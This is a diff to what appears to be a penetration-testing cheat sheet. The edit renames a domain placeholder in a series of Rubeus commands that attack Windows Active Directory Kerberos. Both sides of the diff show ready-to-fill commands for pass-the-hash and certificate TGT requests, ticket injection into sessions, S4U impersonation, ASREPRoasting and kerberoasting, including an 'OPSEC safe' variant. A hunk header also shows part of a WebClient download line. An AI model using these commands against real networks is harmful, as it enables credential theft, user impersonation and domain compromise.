@@ -132,55 +132,55 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap
 ```
 
 ## asktgt - (pth)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap
 ```
 
 ## asktgt - (cert)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /dc:<dc_name> /getcredentials /certificate:<file_or_b64> /password:<pfx_password> /nowrap
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /dc:<dc_name> /getcredentials /certificate:<file_or_b64> /password:<pfx_password> /nowrap
 ```
 
 ## asktgt - and inject in current session (cred)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap /ptt
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap /ptt
 ```
 
 ## asktgt - and inject in current session (pth)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt
 ```
 
 ## asktgt - and inject in another session (cred)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /password:<nt_hash> /nowrap /ptt /luid:<luid>
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap /ptt /luid:<luid>
 ```
 
 ## asktgt - and inject in another session (pth)
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt /luid:<luid>
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt /luid:<luid>
 ```
 
 ## get TGT from nt_hash and inject ticket (pth)
 #cat/ATTACK/CONNECT 
 ```
-.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt_hash> /nowrap /ptt
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap /ptt
 ```
 
 ## asktgs - and inject into current session (ptt)
@@ -226,7 +226,7 @@ Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
 Golden Tickets: krbtgt
 DB admin: MSSQLSvc
 ```
-.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain> /ptt
+.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain_fqdn> /ptt
 ```
 
 
@@ -248,7 +248,7 @@ Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
 Golden Tickets: krbtgt
 DB admin: MSSQLSvc
 ```
-.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain> /ptt
+.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain_fqdn> /ptt
 ```
 
 ## golden - child-parent trust sidHistory injection 
@@ -278,13 +278,13 @@ DB admin: MSSQLSvc
 ## ASREPRoasting - for all users in a trusted domain
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast /domain:<domain_fqdn> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
 ```
 
 ## ASREPRoasting - specific user
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /user:<user> /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast  /user:<user> /domain:<domain_fqdn> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
 ```
 
 ## kerberoasting - current domain
@@ -296,25 +296,25 @@ DB admin: MSSQLSvc
 ## Kerberoasting - and outputting on a file with a spesific format
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain>
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn>
 ```
 
 ## Kerberoasting - while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /rc4opsec
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /rc4opsec
 ```
 
 ## Kerberoast - AES enabled accounts
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /aes
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /aes
 ```
  
 ## Kerberoast - specific user account
 #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /user:<user> /simple
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /user:<user> /simple
 ```
 
 
@@ -322,7 +322,7 @@ DB admin: MSSQLSvc
 #cat/ATTACK/EXPLOIT 
 HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
 ```
-.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain> /ptt
+.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain_fqdn> /ptt
 ```
 
 
